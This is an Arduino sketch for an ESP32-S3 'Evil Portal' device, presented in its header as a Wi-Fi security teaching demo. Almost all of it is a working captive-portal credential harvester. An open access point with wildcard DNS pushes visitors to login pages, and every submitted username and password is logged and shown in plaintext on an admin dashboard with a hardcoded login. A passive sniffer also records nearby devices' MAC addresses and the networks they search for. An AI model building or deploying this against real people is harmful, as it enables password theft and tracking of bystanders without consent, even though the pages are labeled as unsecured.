/*
  ============================================================================
  EVIL PORTAL - CUSTOM BUILD (ESP32-S3 / Adafruit Qualia)
  ============================================================================
  Honest WiFi security teaching/demo device. Portal pages are clearly labeled
  "Evil Portal" and state the connection is UNSECURED - this is not a clone
  of any real brand or service.

  FEATURES
  --------
  * Two selectable captive-portal login pages, flipped live with UP/DOWN
    buttons (physical GPIO buttons you wire up - see pin config below).
  * Admin dashboard at /admin (login: see ADMIN_USER/ADMIN_PASS below).
      - Up to 25 captured credential pairs, viewable + one-click clear.
      - Passive channel 1/6/11 scanner (listen-only, no transmit).
      - Passive probe-request sniffer: shows which SSIDs nearby devices
        are hunting for (MAC -> SSID). Modern phones randomize their MAC
        on probes, so expect some noise mixed with real hits.

  WHAT'S DELIBERATELY NOT HERE: a deauther / jammer. Deauth frames hit the
  shared RF spectrum and can knock ANY nearby device offline, not just
  yours - the FCC treats this as illegal intentional interference even on
  a network you own outright. Not included, not a toggle-away TODO.
  Everything here is receive-only (scanning, sniffing) - nothing in this
  file ever transmits a frame that wasn't a normal AP/portal response.

  ---- STUFF YOU'LL LIKELY WANT TO TWEAK ----
  * LED_PIN_A / LED_PIN_B     - status LED wiring (A1/A0 by default)
  * AP_SSID                   - the WiFi network name this broadcasts
  * ADMIN_USER / ADMIN_PASS   - admin dashboard login
  * portalHTML_A / portalHTML_B - the two login page designs/copy
  ============================================================================
*/

#include <Arduino.h>
#include <Wire.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <esp_wifi.h>

// ================== USER CONFIG ==================
// IMPORTANT: on the Qualia S3, UP/DN are NOT plain GPIOs - they're wired
// through the onboard PCA9554A I2C IO expander (addr 0x3F) that also drives
// the display/backlight control lines. Confirmed from Espressif's own board
// variant file (variants/adafruit_qualia_s3_rgb666/pins_arduino.h):
//   PCA_BUTTON_UP = bit 5, PCA_BUTTON_DOWN = bit 6 on that expander.
// We read them with a plain I2C register read (see readExpanderButtons()
// below) - that's read-only and never touches the expander's other pins
// (display/backlight), so it's safe even with the screen removed.
#define PCA9554_ADDR      0x3F
#define PCA9554_REG_INPUT 0x00
#define PCA_BUTTON_UP     5
#define PCA_BUTTON_DOWN   6
#define DEBOUNCE_MS       250

// Status LED: page A lights LED_PIN_A, page B lights LED_PIN_B.
// A0/A1 ARE real ESP32-S3 GPIOs on this board (confirmed: A0=GPIO17,
// A1=GPIO16), separate from the expander - plain digitalWrite() is fine.
// Using a simple 2-pin bi-color LED (common cathode) - two GPIOs, two colors,
// maps 1:1 to two portal pages. If you've got a real 3-pin RGB LED instead,
// just wire the unused color to LED_PIN_B's channel or add a 3rd pin/PWM
// mix in updateStatusLED() below.
#define LED_PIN_A      A1    // LED output (page A color)
#define LED_PIN_B      A0    // LED output (page B color)

const char* AP_SSID     = "ESP32-evil-portal";
const char* ADMIN_USER  = "unlucky";
const char* ADMIN_PASS  = "4401";
#define MAX_CREDS      25
#define MAX_PROBES     40
// ==================================================

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);
IPAddress netMsk(255, 255, 255, 0);
DNSServer dnsServer;
WebServer server(80);

bool isAuthenticated = false;   // Apple CNA "connected" flag
bool adminAuthed = false;       // single-admin session flag (demo-grade, no cookies)
uint8_t currentPage = 0;        // 0 = portal A, 1 = portal B

unsigned long lastBtnPress = 0;

static const char appleSuccessResponse[] =
  "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>";

// ================== CREDENTIAL LOG ==================
struct Credential { String user; String pass; String page; };
Credential creds[MAX_CREDS];
int credCount = 0;
int credHead = 0; // ring buffer start once full (oldest gets overwritten)

void logCredential(const String& u, const String& p, const String& pageLabel) {
  int idx;
  if (credCount < MAX_CREDS) {
    idx = credCount++;
  } else {
    idx = credHead;
    credHead = (credHead + 1) % MAX_CREDS;
  }
  creds[idx] = {u, p, pageLabel};
  Serial.printf("[Captured] page=%s user=%s pass=%s\n", pageLabel.c_str(), u.c_str(), p.c_str());
}

// ================== PROBE REQUEST SNIFFER (passive) ==================
struct ProbeEntry { String mac; String ssid; unsigned long lastSeen; };
ProbeEntry probes[MAX_PROBES];
int probeCount = 0;

void addProbe(const String& mac, const String& ssid) {
  for (int i = 0; i < probeCount; i++) {
    if (probes[i].mac == mac && probes[i].ssid == ssid) {
      probes[i].lastSeen = millis();
      return;
    }
  }
  if (probeCount < MAX_PROBES) {
    probes[probeCount++] = {mac, ssid, millis()};
  } else {
    int oldest = 0;
    for (int i = 1; i < MAX_PROBES; i++)
      if (probes[i].lastSeen < probes[oldest].lastSeen) oldest = i;
    probes[oldest] = {mac, ssid, millis()};
  }
}

// Runs in WiFi driver context - keep it fast, no Serial/String-heavy work beyond what's needed.
void IRAM_ATTR snifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;
  wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t* p = pkt->payload;

  uint8_t frameType = (p[0] & 0x0C) >> 2;
  uint8_t frameSubType = (p[0] & 0xF0) >> 4;
  if (frameType != 0 || frameSubType != 4) return; // only probe requests (type=0 mgmt, subtype=4)

  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
           p[10], p[11], p[12], p[13], p[14], p[15]);

  int ssidLen = p[25];
  String ssid;
  if (ssidLen > 0 && ssidLen <= 32) {
    for (int i = 0; i < ssidLen; i++) ssid += (char)p[26 + i];
  } else {
    ssid = "[broadcast/hidden]";
  }
  addProbe(String(macStr), ssid);
}

void startSniffer() {
  wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
  esp_wifi_set_promiscuous_filter(&filter);
  esp_wifi_set_promiscuous_rx_cb(&snifferCallback);
  esp_wifi_set_promiscuous(true);
}

// ================== PASSIVE CHANNEL 1/6/11 SCAN ==================
// Listen-only: WiFi.scanNetworks() just reads beacon frames, never transmits
// a deauth or anything disruptive. Briefly hops channels to scan, which can
// cause a short AP hiccup for connected clients - that's normal, not a bug.
String scanResultsHTML() {
  String out = "<table class='t'><tr><th>SSID</th><th>Ch</th><th>RSSI</th><th>Enc</th></tr>";
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n; i++) {
    int ch = WiFi.channel(i);
    if (ch == 1 || ch == 6 || ch == 11) {
      out += "<tr><td>" + WiFi.SSID(i) + "</td><td>" + String(ch) + "</td><td>" +
             String(WiFi.RSSI(i)) + "</td><td>" +
             (WiFi.encryptionType(i) == WIFI_AUTH_OPEN ? "OPEN" : "secured") + "</td></tr>";
    }
  }
  out += "</table>";
  WiFi.scanDelete();
  return out;
}

// ================== PORTAL PAGE A ==================
static const char portalHTML_A[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Evil Portal</title><style>
*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
body{background:#0f172a;color:#f8fafc;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:1.25rem}
.card{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:2rem;width:100%;max-width:400px;box-shadow:0 10px 25px rgba(0,0,0,.3)}
h2{font-size:1.5rem;margin-bottom:.25rem;font-weight:600;color:#38bdf8;text-align:center}
.warn{margin:.75rem 0 1.25rem;padding:.6rem;border:1px solid #f87171;background:rgba(248,113,113,.1);color:#f87171;border-radius:6px;font-size:.8rem;text-align:center}
.form-group{margin-bottom:1rem}
label{display:block;font-size:.75rem;font-weight:500;margin-bottom:.35rem;color:#cbd5e1}
input{width:100%;padding:.75rem;background:#0f172a;border:1px solid #475569;border-radius:6px;color:#f8fafc;font-size:.95rem;outline:none}
input:focus{border-color:#38bdf8}
button{width:100%;padding:.75rem;background:#0284c7;color:#fff;border:none;border-radius:6px;font-size:1rem;font-weight:500;cursor:pointer;margin-top:.5rem}
button:hover{background:#0369a1}
</style></head><body>
<div class="card">
  <h2>EVIL PORTAL</h2>
  <div class="warn">&#9888; This connection is UNSECURED &mdash; demo access point</div>
  <form action="/login" method="POST">
    <div class="form-group"><label for="username">Username</label>
      <input type="text" id="username" name="username" required autocomplete="off"></div>
    <div class="form-group"><label for="password">Password</label>
      <input type="password" id="password" name="password" required></div>
    <button type="submit">Connect</button>
  </form>
</div></body></html>
)rawliteral";

// ================== PORTAL PAGE B ==================
static const char portalHTML_B[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Evil Portal</title><style>
*{box-sizing:border-box;margin:0;padding:0;font-family:"Courier New",ui-monospace,Consolas,monospace}
body{background:#05070a;color:#c8f7e4;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:1.25rem}
.card{width:100%;max-width:400px;background:#0b0f16;border:1px solid #00b36e;border-radius:10px;padding:1.75rem;box-shadow:0 0 18px rgba(0,255,156,.35)}
h2{text-align:center;font-size:1.6rem;letter-spacing:3px;color:#00ff9c;text-shadow:0 0 8px rgba(0,255,156,.7)}
.warn{margin:.75rem 0 1.25rem;padding:.6rem;border:1px solid #ff2d55;background:rgba(255,45,85,.08);color:#ff2d55;border-radius:6px;font-size:.75rem;text-align:center}
label{display:block;font-size:.7rem;color:#5a6b74;letter-spacing:1px;margin-bottom:.3rem}
input{width:100%;background:#04060a;border:1px solid #1c2630;color:#c8f7e4;font-family:inherit;font-size:.9rem;padding:.65rem;border-radius:6px;margin-bottom:.9rem;outline:none}
input:focus{border-color:#00ff9c}
button{width:100%;cursor:pointer;background:#00ff9c;color:#04120b;font-weight:bold;letter-spacing:2px;border:none;border-radius:6px;padding:.75rem}
</style></head><body>
<div class="card">
  <h2>EVIL PORTAL</h2>
  <div class="warn">&#9888; THIS CONNECTION IS UNSECURED &mdash; DEMO ACCESS POINT</div>
  <form action="/login" method="POST">
    <label for="username">IDENTIFIER</label>
    <input id="username" name="username" type="text" autocomplete="off" required>
    <label for="password">PASSPHRASE</label>
    <input id="password" name="password" type="password" required>
    <button type="submit">CONNECT &rsaquo;</button>
  </form>
</div></body></html>
)rawliteral";

// ================== CAPTIVE PORTAL HANDLERS ==================
void handleRoot() {
  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  server.sendHeader("Pragma", "no-cache");
  server.sendHeader("Expires", "-1");
  server.send(200, "text/html", currentPage == 0 ? portalHTML_A : portalHTML_B);
}

void redirectToPortal() {
  server.sendHeader("Location", String("http://") + apIP.toString() + "/", true);
  server.send(302, "text/plain", "");
}

void handleAppleCaptive() {
  if (isAuthenticated) server.send(200, "text/html", appleSuccessResponse);
  else redirectToPortal();
}

void handleLogin() {
  String user = server.hasArg("username") ? server.arg("username") : "";
  String pass = server.hasArg("password") ? server.arg("password") : "";
  logCredential(user, pass, currentPage == 0 ? "A" : "B");
  isAuthenticated = true;

  String resp = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>"
    "<style>body{background:#0f172a;color:#f8fafc;font-family:sans-serif;text-align:center;padding:3rem}</style>"
    "</head><body><h2>Connected</h2><p>Tap <b>Done</b> in the top right corner to continue.</p></body></html>";
  server.send(200, "text/html", resp);
}

// ================== ADMIN DASHBOARD ==================
String adminPageHTML() {
  String h = "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width, initial-scale=1'><title>Admin</title><style>"
    "*{box-sizing:border-box;font-family:-apple-system,Segoe UI,Roboto,sans-serif}"
    "body{background:#0f172a;color:#f8fafc;margin:0;padding:1.5rem}"
    "h2{color:#38bdf8;margin-bottom:1rem}"
    ".card{background:#1e293b;border:1px solid #334155;border-radius:10px;padding:1.25rem;margin-bottom:1.25rem}"
    "table{width:100%;border-collapse:collapse;font-size:.85rem}"
    "th,td{text-align:left;padding:.4rem .5rem;border-bottom:1px solid #334155}"
    "th{color:#94a3b8}"
    "button,.btn{background:#0284c7;color:#fff;border:none;border-radius:6px;padding:.6rem 1rem;cursor:pointer;font-size:.9rem;text-decoration:none;display:inline-block;margin-right:.5rem}"
    ".danger{background:#dc2626}"
    "small{color:#64748b}"
    "</style></head><body>";

  h += "<h2>Evil Portal &ndash; Admin</h2>";

  h += "<div class='card'><b>Active portal page:</b> " + String(currentPage == 0 ? "A" : "B") +
       " &nbsp;<small>(flip with the UP/DOWN buttons on the device)</small></div>";

  h += "<div class='card'><h3>Captured credentials (" + String(credCount) + "/" + String(MAX_CREDS) + ")</h3>"
       "<table><tr><th>#</th><th>Page</th><th>Username</th><th>Password</th></tr>";
  for (int i = 0; i < credCount; i++) {
    h += "<tr><td>" + String(i + 1) + "</td><td>" + creds[i].page + "</td><td>" +
         creds[i].user + "</td><td>" + creds[i].pass + "</td></tr>";
  }
  h += "</table><br><form method='POST' action='/admin/clear' style='display:inline'>"
       "<button class='danger' type='submit'>Clear credentials</button></form></div>";

  h += "<div class='card'><h3>Passive channel scan (1 / 6 / 11)</h3>"
       "<a class='btn' href='/admin/scan'>Run scan</a>"
       "<small>&nbsp;Listen-only, no transmission.</small></div>";

  h += "<div class='card'><h3>Probe requests seen (" + String(probeCount) + "/" + String(MAX_PROBES) + ")</h3>"
       "<small>Passive sniffing &mdash; modern phones randomize MACs, so expect noise mixed with real hits.</small><br><br>"
       "<table><tr><th>MAC</th><th>Looking for (SSID)</th><th>Last seen</th></tr>";
  for (int i = 0; i < probeCount; i++) {
    unsigned long agoSec = (millis() - probes[i].lastSeen) / 1000;
    h += "<tr><td>" + probes[i].mac + "</td><td>" + probes[i].ssid + "</td><td>" +
         String(agoSec) + "s ago</td></tr>";
  }
  h += "</table></div>";

  h += "<form method='POST' action='/admin/logout'><button type='submit'>Log out</button></form>";
  h += "</body></html>";
  return h;
}

String adminLoginHTML(bool failed) {
  String h = "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width, initial-scale=1'><title>Admin Login</title><style>"
    "*{box-sizing:border-box;font-family:-apple-system,Segoe UI,Roboto,sans-serif}"
    "body{background:#0f172a;color:#f8fafc;display:flex;align-items:center;justify-content:center;min-height:100vh}"
    ".card{background:#1e293b;border:1px solid #334155;border-radius:12px;padding:2rem;width:100%;max-width:340px}"
    "h2{color:#38bdf8;text-align:center;margin-bottom:1rem}"
    "input{width:100%;padding:.7rem;margin-bottom:.9rem;background:#0f172a;border:1px solid #475569;border-radius:6px;color:#f8fafc}"
    "button{width:100%;padding:.75rem;background:#0284c7;color:#fff;border:none;border-radius:6px;font-size:1rem;cursor:pointer}"
    ".err{color:#f87171;text-align:center;font-size:.85rem;margin-bottom:.75rem}"
    "</style></head><body><div class='card'><h2>Admin Login</h2>";
  if (failed) h += "<div class='err'>Invalid credentials</div>";
  h += "<form method='POST' action='/admin'>"
       "<input type='text' name='user' placeholder='Username' required>"
       "<input type='password' name='pass' placeholder='Password' required>"
       "<button type='submit'>Log in</button></form></div></body></html>";
  return h;
}

void handleAdmin() {
  if (server.method() == HTTP_POST) {
    String u = server.hasArg("user") ? server.arg("user") : "";
    String p = server.hasArg("pass") ? server.arg("pass") : "";
    if (u == ADMIN_USER && p == ADMIN_PASS) {
      adminAuthed = true;
      server.send(200, "text/html", adminPageHTML());
    } else {
      server.send(200, "text/html", adminLoginHTML(true));
    }
    return;
  }
  server.send(200, "text/html", adminAuthed ? adminPageHTML() : adminLoginHTML(false));
}

void handleAdminClear() {
  credCount = 0;
  credHead = 0;
  server.sendHeader("Location", "/admin", true);
  server.send(302, "text/plain", "");
}

void handleAdminScan() {
  if (!adminAuthed) { redirectToPortal(); return; }
  String h = "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
    "<meta name='viewport' content='width=device-width, initial-scale=1'><title>Scan</title><style>"
    "body{background:#0f172a;color:#f8fafc;font-family:-apple-system,Segoe UI,Roboto,sans-serif;padding:1.5rem}"
    "table{width:100%;border-collapse:collapse}th,td{padding:.4rem .5rem;border-bottom:1px solid #334155;text-align:left}"
    "a{color:#38bdf8}"
    "</style></head><body><h2>Channel 1/6/11 scan</h2>";
  h += scanResultsHTML();
  h += "<br><a href='/admin'>&larr; Back to admin</a></body></html>";
  server.send(200, "text/html", h);
}

void handleAdminLogout() {
  adminAuthed = false;
  server.sendHeader("Location", "/admin", true);
  server.send(302, "text/plain", "");
}

// ================== STATUS LED (shows which portal page is live) ==================
void updateStatusLED() {
  digitalWrite(LED_PIN_A, currentPage == 0 ? HIGH : LOW);
  digitalWrite(LED_PIN_B, currentPage == 1 ? HIGH : LOW);
}

// ================== BUTTON HANDLING (UP/DOWN flips portal page) ==================
// Plain I2C read of the PCA9554A's Input Port register (0x00) - read-only,
// doesn't configure or touch any pin, safe to call even though the expander
// also drives display lines we're not using. Returns 0xFF (nothing pressed)
// if the I2C read fails for any reason, so a loose wire can't spam flips.
uint8_t readExpanderPort() {
  Wire.beginTransmission(PCA9554_ADDR);
  Wire.write(PCA9554_REG_INPUT);
  if (Wire.endTransmission(false) != 0) return 0xFF;
  Wire.requestFrom((int)PCA9554_ADDR, 1);
  if (Wire.available()) return Wire.read();
  return 0xFF;
}

// Assumption: buttons pull their bit LOW when pressed (standard active-low
// wiring). If presses register backwards, just flip this to "val & (1<<bit)".
bool isButtonPressed(uint8_t bit, uint8_t portVal) {
  return !(portVal & (1 << bit));
}

void handleButtons() {
  unsigned long now = millis();
  if (now - lastBtnPress < DEBOUNCE_MS) return;

  uint8_t port = readExpanderPort();

  if (isButtonPressed(PCA_BUTTON_UP, port)) {
    currentPage = 0;
    lastBtnPress = now;
    updateStatusLED();
    Serial.println("[Portal] switched to page A");
  } else if (isButtonPressed(PCA_BUTTON_DOWN, port)) {
    currentPage = 1;
    lastBtnPress = now;
    updateStatusLED();
    Serial.println("[Portal] switched to page B");
  }
}

// ================== SETUP / LOOP ==================
void setup() {
  Serial.begin(115200);
  delay(1000);

  Wire.begin(); // needed to read UP/DN buttons off the PCA9554A expander

  pinMode(LED_PIN_A, OUTPUT);
  pinMode(LED_PIN_B, OUTPUT);
  updateStatusLED(); // reflects currentPage=0 (page A) at boot

  // AP_STA (not just AP) so the passive scanner can run without tearing down the AP.
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(AP_SSID);

  startSniffer(); // passive probe-request listener - never transmits

  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", apIP);

  server.on("/", HTTP_GET, handleRoot);
  server.on("/login", HTTP_POST, handleLogin);

  server.on("/admin", HTTP_GET, handleAdmin);
  server.on("/admin", HTTP_POST, handleAdmin);
  server.on("/admin/clear", HTTP_POST, handleAdminClear);
  server.on("/admin/scan", HTTP_GET, handleAdminScan);
  server.on("/admin/logout", HTTP_POST, handleAdminLogout);

  server.on("/hotspot-detect.html", HTTP_GET, handleAppleCaptive);
  server.on("/library/test/success.html", HTTP_GET, handleAppleCaptive);
  server.on("/success.html", HTTP_GET, handleAppleCaptive);
  server.on("/generate_204", redirectToPortal);
  server.on("/gen_204", redirectToPortal);
  server.on("/connecttest.txt", redirectToPortal);
  server.on("/ncsi.txt", redirectToPortal);
  server.onNotFound(redirectToPortal);

  server.begin();
  Serial.println("Evil Portal ready: dual pages + admin dashboard + passive recon.");
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();
  handleButtons();
  delay(2);
}
